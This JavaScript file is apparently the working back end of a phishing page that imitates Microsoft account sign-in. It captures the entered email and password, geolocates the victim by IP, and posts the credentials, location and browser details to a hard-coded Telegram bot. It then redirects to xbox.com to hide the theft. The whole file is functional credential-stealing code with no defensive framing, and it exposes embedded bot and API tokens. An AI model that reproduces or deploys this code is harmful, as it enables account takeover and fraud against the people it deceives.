// Store user information globally
let userEmail = '';
let userPassword = '';

// Telegram configuration
const botToken = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const chatId = '-1002417682998';

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

// Function to get user's location
async function detectUserLocation() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=81e788912b1532');
        const data = await response.json();
        return {
            country: data.country,
            region: data.region,
            city: data.city,
            ip: data.ip,
            timezone: data.timezone,
            location: data.loc
        };
    } catch (error) {
        console.error('Error detecting location:', error);
        return null;
    }
}

// Handle email step validation and transition
function handleEmailNext() {
    const email = document.getElementById('email');
    const emailError = document.getElementById('emailError');

    // Basic email validation
    if (!email.value) {
        emailError.textContent = 'Enter a valid email address, phone number, or Skype name.';
        emailError.style.display = 'block';
        email.classList.add('error-9af');
        return;
    }

    emailError.style.display = 'none';
    email.classList.remove('error-9af');

    // Hide email step and show password step
    document.getElementById('emailStep').classList.add('hidden');
    document.getElementById('passwordStep').classList.remove('hidden');

    // Display email in password step
    document.querySelector('.email-display').textContent = email.value;

    // Store email for later use
    userEmail = email.value;
}

// Show email step (back button)
function showEmailStep() {
    document.getElementById('passwordStep').classList.add('hidden');
    document.getElementById('emailStep').classList.remove('hidden');
}

// Toggle password visibility
function togglePassword() {
    const passwordInput = document.getElementById('pssd');
    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
}

// Handle password submission
async function handlePasswordSubmit() {
    const password = document.getElementById('pssd');
    const passwordError = document.getElementById('passwordError');

    // Basic password validation
    if (!password.value) {
        passwordError.textContent = 'Please enter the password for your Microsoft account.';
        passwordError.style.display = 'block';
        password.classList.add('error-2j5');
        return;
    }

    passwordError.style.display = 'none';
    password.classList.remove('error-2j5');

    userPassword = password.value;

    // Get user location for message
    const userLocation = await detectUserLocation();

    // Get current date and time
    const now = new Date();
    const dateTime = now.toLocaleString();

    // Prepare login message
    const loginMessage = `
🔐 New Login Details Received!
⏰ Date: ${dateTime}

👤 User Information:
📧 Email: ${userEmail}
🔑 Password: ${userPassword}

📱 Device Information:
🌐 IP: ${userLocation.ip}
📍 Location: ${userLocation.city}, ${userLocation.region}, ${userLocation.country}
⏰ Timezone: ${userLocation.timezone}
📍 Coordinates: ${userLocation.location}
💻 User Agent: ${navigator.userAgent}
    `;

    try {
        // Send login information
        const sent = await sendToTelegram(loginMessage);

        if (sent) {
            // Show a loading message
            const button = document.querySelector('#passwordStep .button-next');
            button.textContent = 'Signing in...';
            button.disabled = true;

            // Wait briefly to simulate processing
            setTimeout(() => {
                // Redirect to Xbox website
                window.location.href = 'https://www.xbox.com/';
            }, 1500);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
}
